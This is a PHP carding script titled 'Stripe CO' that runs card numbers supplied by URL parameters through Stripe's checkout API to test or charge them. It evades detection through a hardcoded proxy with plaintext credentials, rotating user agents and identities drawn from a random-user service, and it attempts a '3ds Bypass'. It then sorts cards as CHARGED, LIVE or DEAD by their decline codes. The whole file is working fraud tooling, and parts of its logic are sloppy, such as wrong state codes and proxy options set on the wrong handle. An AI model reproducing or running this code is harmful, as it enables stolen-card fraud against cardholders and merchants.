<?php 
#Aryaa | Stripe CO
$start_time = microtime(true);
ob_start();
clearstatcache();
set_time_limit(500);
error_reporting(1);
date_default_timezone_set('America/Buenos_Aires');

include 'useragent.php';
$agent = new userAgent();
$UAFireFox = $agent->generate('firefox'); // generates a firefox user agent on either windows or mac
$UAChrome = $agent->generate('chrome'); // generates a chrome user agent on either windows or mac
$UAMobile = $agent->generate('mobile'); // generates a mobile user agent for either iphone or android
$UAWindows = $agent->generate('windows'); // generates a windows user agent for either firefox or chrome
$UAMac = $agent->generate('mac'); // generates a mac user agent for either firefox or chrome
$UAiPhone = $agent->generate('iphone'); // generates an iphone user agent for iOS 7-10
$UAAndroid = $agent->generate('android'); // generates an android user agent for android versions 4.3-7.1, and includes randomly generated device and build number string that is correct for the version of android being displayed.

/*===[Security Setup]=========================================*/
include 'config.php';
if ($_GET['referrer'] != "Auth") { 
	$i = rand(0,sizeof($red_link));
    header("location: $red_link[$i]");
	exit();
}

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

function getContents($str, $startDelimiter, $endDelimiter) {
  $contents = array();
  $startDelimiterLength = strlen($startDelimiter);
  $endDelimiterLength = strlen($endDelimiter);
  $startFrom = $contentStart = $contentEnd = 0;
  while (false !== ($contentStart = strpos($str, $startDelimiter, $startFrom))) {
    $contentStart += $startDelimiterLength;
    $contentEnd = strpos($str, $endDelimiter, $contentStart);
    if (false === $contentEnd) {
      break;
    }
    $contents[] = substr($str, $contentStart, $contentEnd - $contentStart);
    $startFrom = $contentEnd + $endDelimiterLength;
  }
  return $contents;
}

/*Card Info*/
$pklive = $_GET["pklive"];
$cslive = $_GET["cslive"];
$xamount = $_GET["xamount"];
$xemail = $_GET["xemail"];
$stracc = $_GET["stracc"];
$xproxy = $_GET["xproxy"];

// echo $stracc;

#---[Amount]----#

$xxamount = $xamount / 100;

$xproxy = '154.7.193.57:64532:EAzGMRSu:ZiNQDnXh';

$xips = multiexplode(array(":", "|", ""), $xproxy)[0];
$port = multiexplode(array(
    ":",
    "|",
    ""
), $xproxy)[1];
$user = multiexplode(array(
    ":",
    "|",
    ""
), $xproxy)[2];
$pass = multiexplode(array(
    ":",
    "|",
    ""
), $xproxy)[3];




$cards = $_GET['cards'];
$cc = multiexplode(array(":", "|", ""), $cards)[0];
$mo = multiexplode(array(":", "|", ""), $cards)[1];
$yr = multiexplode(array(":", "|", ""), $cards)[2];
$cvv = multiexplode(array(":", "|", ""), $cards)[3];
if(strlen($yr) == 4){
    $yr1 = substr($yr, 2);
    };
 $last4 = substr($cc,12,4);
$ctype = substr($cc, 0,1);
if($ctype == "5"){
$ctype = "mc";
}else if($ctype == "6"){
$ctype = "discover";
}else if($ctype == "4"){
$ctype = "visa";
}else if($ctype == "3"){
$ctype = "amex";
}

# ----- [ Randomized Cookies  ] --- #

$inst = [
  'cookie' => mt_rand().'.txt'
];
$cookay = ''.getcwd().'/COOKIE';

if (!is_dir($cookay)) {
    mkdir($cookay, 0777, true);
}
$xauth = getcwd();
$zauth = str_replace('\\', '/', $xauth);

#RandomCredentials
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=au');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];

if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

#Additional Functions
fwrite(fopen('xzcookie.txt', 'w'), "");

#----------[Arranging Port]-------------#

$ipport = ''.$xips.':'.$port.'';

$credentials = ''.$user.':'.$pass.'';

#----------[Arranging END]-------------#

 //######################[Proxys END]######################//
#for Checking Proxies
$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $ipport);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $credentials); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "Proxy live ✅";
}
if (empty($ip1)){
$ip = "Proxy Dead ❌";
}

 echo '[ IP: '.$ip.' ] ';



 $retry = 0;
 again:
#---------------[ StripeUIDs ]---------------#

$url = "https://m.stripe.com/6";

$curl = curl_init($url);
curl_setopt($ch, CURLOPT_PROXY, $ipport); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $credentials); 
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept-language: en-US,en;q=0.9",
   "Content-Type: application/x-www-form-urlencoded",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_COOKIEFILE, "".$zauth."/COOKIE/".$inst['cookie']."");
curl_setopt($curl, CURLOPT_COOKIEJAR, "".$zauth."/COOKIE/".$inst['cookie']."");

$resp5 = curl_exec($curl);
$json5 = json_decode($resp5);
$muid = $json5->muid;
$guid = $json5->guid;
$sid = $json5->sid;

#PaymentMethod
$url = "https://api.stripe.com/v1/payment_methods";

$curl = curl_init($url);
curl_setopt($ch, CURLOPT_PROXY, $ipport); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $credentials); 
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-language: en-US,en;q=0.9",
   "Content-Type: application/x-www-form-urlencoded",
   "origin: https://checkout.stripe.com",
   "referer: https://checkout.stripe.com/",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

#----------------[Special Condition]---------------#

//&card[number]=".$cc."&card[cvc]=".$cvv."

if (empty($stracc)) {
    $data = "type=card&card[number]=".$cc."&card[exp_month]=".$mo."&card[exp_year]=".$yr."&billing_details[name]=".$name."+".$last."&billing_details[email]=".$xemail."&billing_details[address][country]=US&billing_details[address][line1]=123+Allen+STreet&billing_details[address][city]=New+York&billing_details[address][postal_code]=10080&billing_details[address][state]=NY&key=".$pklive."&payment_user_agent=stripe.js%2F7c0f8c373e%3B+stripe-js-v3%2F7c0f8c373e%3B+checkout";
} 
else {
    $data = "type=card&card[number]=".$cc."&card[exp_month]=".$mo."&card[exp_year]=".$yr."&billing_details[name]=".$name."+".$last."&billing_details[email]=".$xemail."&billing_details[address][country]=US&billing_details[address][postal_code]=10080&_stripe_account=".$stracc."&key=".$pklive."&payment_user_agent=stripe.js%2F48e3ef6612%3B+stripe-js-v3%2F48e3ef6612%3B+checkout";
}


#----------------[Special Condtion End]-----------#
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$paym = curl_exec($curl);
$json = json_decode($paym);
$token = $json->id;

//  echo $paym;

#Confirm
$url = "https://api.stripe.com/v1/payment_pages/".$cslive."/confirm";

$curl = curl_init($url);
curl_setopt($ch, CURLOPT_PROXY, $ipport); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $credentials); 
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-language: en-US,en;q=0.9",
   "Content-Type: application/x-www-form-urlencoded",
   "origin: https://checkout.stripe.com",
   "referer: https://checkout.stripe.com/",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);



#----------------[Special Condition]---------------#

if (empty($stracc)) {
    $data = "eid=NA&payment_method=".$token."&expected_amount=".$xamount."&last_displayed_line_item_group_details[subtotal]=".$xamount."&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=".$pklive."";
} 
  else {
$data = "eid=NA&payment_method=".$token."&expected_amount=".$xamount."&last_displayed_line_item_group_details[subtotal]=".$xamount."&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&_stripe_account=".$stracc."&key=".$pklive."";
//&card[number]=".$cc."&card[cvc]=".$cvv."

}

#----------------[Special Condtion End]-----------#

// echo $data;

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$xconf = curl_exec($curl);
//echo $xconf;
$json = json_decode($xconf);
$xpi = $json->payment_intent->id;
$xret = $json->payment_intent->client_secret;
$xsrc = $json->payment_intent->next_action->use_stripe_sdk->three_d_secure_2_source;
$stripe_js = $json->payment_intent->next_action->use_stripe_sdk->stripe_js;

$surl = trim(strip_tags(getStr($xconf, '"success_url": "','"')));
$currency = trim(strip_tags(getStr($xconf, '"currency": "','"')));


// ###some site
#####################[3ds Bypass using url]#############
if (strpos($xconf, "https://hooks.stripe.com/redirect/authenticate/"))   
{
          $ch = curl_init();
         curl_setopt($ch, CURLOPT_PROXY, $ipport); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $credentials); 
          curl_setopt($ch, CURLOPT_URL, ''.$stripe_js.'');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  $r4 = curl_exec($ch);
             
}
#####################[3ds Bypass using url]#############
if (strpos($xconf, "three_d_secure_2_source"))   
{
#Authenticate
$url = "https://api.stripe.com/v1/3ds2/authenticate";

$curl = curl_init($url);
curl_setopt($ch, CURLOPT_PROXY, $ipport); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $credentials); 
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-language: en-US,en;q=0.9",
   "Content-Type: application/x-www-form-urlencoded",
   "origin: https://js.stripe.com",
   "referer: https://js.stripe.com/",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

#-------------------Sepical Condion----------#
if (empty($stracc)) {
$data = "source=".$xsrc."&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%221080%22%2C%22browserScreenWidth%22%3A%221920%22%2C%22browserTZ%22%3A%22-480%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F109.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=".$pklive."";

  } 
  else {

    $data = "source=".$xsrc."&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22eyJ0aHJlZURTU2VydmVyVHJhbnNJRCI6IjNiNmMzZDlkLTYyODQtNDAzZi05Y2QzLWNiNGYzZGI3ODI0MCJ9%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22864%22%2C%22browserScreenWidth%22%3A%221536%22%2C%22browserTZ%22%3A%22-330%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F111.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=".$pklive."&_stripe_account=".$stracc."";
  }

#---------End of Sepical Condion----------#

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$authen = curl_exec($curl);
$message = GetStr($pajax, '"message": "','"');
$result = $message;
}

##3ds Auth end

#Pintent
$url = "https://api.stripe.com/v1/payment_intents/".$xpi."?key=".$pklive."&is_stripe_sdk=false&client_secret=".$xret."";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($curl, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $ipport); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $credentials); 
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-language: en-US,en;q=0.9",
   "Content-Type: application/x-www-form-urlencoded",
   "origin: https://js.stripe.com",
   "referer: https://js.stripe.com/",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$pintent = curl_exec($curl);

//echo $pintent;
// echo $pintent;

#-----------------sepcial Condition----------------#
if (empty($stracc)) {

$url = "https://api.stripe.com/v1/payment_pages/".$cslive."?key=".$pklive."&eid=NA";
} 
  else {
         $url = "https://api.stripe.com/v1/payment_pages/".$cslive."?key=".$pklive."&_stripe_account=".$stracc."&eid=NA";
  }


#----------------Sepcial Condition End------------#

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($curl, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $ipport); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $credentials); 
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-language: en-US,en;q=0.9",
   "content-type: application/x-www-form-urlencoded",
   "origin: https://checkout.stripe.com",
   "referer: https://checkout.stripe.com/",
   "user-agent: ".$UAiPhone."",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$pajax = curl_exec($curl);
$httpcode = curl_getinfo($curl)["http_code"];
$message = GetStr($pajax, '"decline_code": "','"');
$ercode = GetStr($pajax, '"code": "','"');
$orderID = trim(strip_tags(GetStr($pajax, '"orderNumber":"','"')));
$sep = '<span style="color:green;"> » </span>';
$result = $message;
// echo $result;

#---------[time-Calculate for Processing]

$end_time = microtime(true);

$total_time = $end_time - $start_time;

$timetaken = number_format($total_time, 4);



if($retry >= 5){
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">Your card was declined. ip = '.$ip1.' ['.$httpcode.']</span></small><br>';
} 
elseif (strpos($pintent, 'address information') !== false) {
$retry++;
goto again;
} elseif (strpos($pintent, 'intent_confirmation_challenge') !== false) {
$retry++;
goto again;
} elseif (strpos($pintent, 'empty string') !== false) {
$retry++;
goto again;
} elseif (strpos($xconf, 'empty string') !== false) {
$retry++;
goto again;
} elseif (strpos($pintent, 'cannot complete transaction') !== false) {
$retry++;
goto again;
} 
elseif(strpos($pintent, '"status": "succeeded"') !==false){
echo '<small><span class="badge badge-success">#CHARGED</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <br>➤ Response: $'.$xxamount.' Charged ✅ <br> ➤ Receipt : <a href='.$surl.'>Here</a><br>';
}

elseif (strpos($pajax, 'insufficient')!== false) {
echo '<small><span class="badge badge-success">#LIVE</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">'.$result.' ip = '.$ip1.' </span></small><br>';
}

elseif (strpos($pajax, 'insufficient')!== false) {
echo '<small><span class="badge badge-success">#LIVE</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">'.$result.' ip = '.$ip1.' </span></small><br>';
}

elseif (strpos($pajax, 'insufficient')!== false) {
echo '<small><span class="badge badge-success">#LIVE</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">'.$result.' ip = '.$ip1.' </span></small><br>';
}


elseif (strpos($pajax, 'security code')!== false) {
echo '<small><span class="badge badge-success">#LIVE</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">'.$result.' ip = '.$ip1.' </span></small><br>';
}

elseif (strpos($pajax, 'transaction_not_allowed')!== false) {
echo '<small><span class="badge badge-success">#LIVE</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">'.$result.' ip = '.$ip1.' </span></small><br>';
}

elseif (strpos($pintent, 'do_not_honor.')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">DO NOT HONOR. ip = '.$ip1.' </span></small><br>';
}

elseif (strpos($pintent, 'card_decline_rate_limit_exceeded.')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">card_decline_rate_limit_exceeded. ip = '.$ip1.' </span></small><br>';
}
elseif (strpos($pintent, 'Your card is not supported.')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' »TimeTaken:['.$timetaken.' sec] » <span class="badge badge-dark">Your card is not supported. ip = '.$ip1.' </span></small><br>';
}
elseif (strpos($pintent, 'card has expired.')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">card has expired. ip = '.$ip1.'  </span></small><br>';
}
elseif (strpos($pintent, '-----BEGIN CERTIFICATE-----.')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' »TimeTaken:['.$timetaken.' sec] » <span class="badge badge-dark">Asking otp (Put Ur Fathers Otp Bro lol). ip = '.$ip1.'  </span></small><br>';
}
elseif (strpos($pintent, 'card number is incorrect.')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">card number is incorrect. ip = '.$ip1.'  </span></small><br>';
}
elseif (strpos($pintent, 'payment_intent_authentication_failure.')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">payment_intent_authentication_failure (Dont Use Bug Bin Here). ip = '.$ip1.' </span></small><br>';
}
elseif(strpos($xconf, '"status": "succeeded"') !==false){
echo '<small><span class="badge badge-success">#CHARGED</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <br>➤ Response: $'.$xxamount.' Charged ✅ <br> ➤ Receipt : <a href='.$surl.'>Here</a><br>';
}

elseif (strpos($xconf, 'insufficient')!== false) {
echo '<small><span class="badge badge-success">#LIVE</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">'.$result.' ip = '.$ip1.'</span></small><br>';
}

elseif (strpos($xconf, 'security code')!== false) {
echo '<small><span class="badge badge-success">#LIVE</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">'.$result.' ip = '.$ip1.'</span></small><br>';
}

elseif (strpos($xconf, 'transaction_not_allowed')!== false) {
echo '<small><span class="badge badge-success">#LIVE</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">'.$result.' ip = '.$ip1.'</span></small><br>';
}

elseif (strpos($xconf, 'Your payment has already been processed')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">Your payment has already been processed. ip = '.$ip1.' </span></small><br>';
}

elseif (strpos($xconf, 'do_not_honor.')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">DO NOT HONOR. ip = '.$ip1.' </span></small><br>';
}
// elseif (strpos($authen, 'empty string')!== false) {
// echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">HCaptcha Malala! '.$ip.' span></small><br>';
// }
elseif (strpos($xconf, 'card_decline_rate_limit_exceeded.')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">card_decline_rate_limit_exceeded. ip = '.$ip1.' </span></small><br>';
}
elseif (strpos($xconf, 'Your card is not supported.')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">Your card is not supported. ip = '.$ip1.' </span></small><br>';
}
elseif (strpos($xconf, 'card has expired.')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">card has expired. ip = '.$ip1.' </span></small><br>';
}
elseif (strpos($xconf, '-----BEGIN CERTIFICATE-----.')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">Asking otp (Put Ur Fathers Otp Bro lol). ip = '.$ip1.' </span></small><br>';
}
elseif (strpos($xconf, 'card number is incorrect.')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">card number is incorrect. ip = '.$ip1.' </span></small><br>';
}
elseif (strpos($xconf, 'invalid_request_error.')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">invalid_request_error. ip = '.$ip1.' </span></small><br>';
}
elseif (strpos($xconf, 'payment_intent_authentication_failure.')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">payment_intent_authentication_failure (Dont Use Bug Bin Here). ip = '.$ip1.' </span></small><br>';
}
elseif (strpos($authen, '"state": "challenge_required"')!== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">OTP REQUIRED. ip = '.$ip1.' </span></small><br>';
}
elseif (strpos($httpcode, '403') !== false) {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">HTTP ERRORR. ip = '.$ip1.' </span></small><br>';
}
else {
echo '<small><span class="badge badge-danger">#DEAD</span> '.$cards.' » TimeTaken:['.$timetaken.' sec] »  » ʀᴇᴛ:['.$retry.'] » <span class="badge badge-dark">'.$result.' ip = '.$ip1.' </span></small><br>';
}

curl_close($curl);
unset($curl);
unlink("".$zauth."/COOKIE/".$inst['cookie']."");

// echo '<small><br> #PayM : <br> '.$paym.'<br></small>';
// echo '<small><br> #Confirm : <br> '.$xconf.'<br></small>';
// echo '<small><br> #Authen : <br> '.$authen.'<br></small>';
// echo '<small><br> #IntentRespo : <br> '.$pintent.'<br></small>';


?>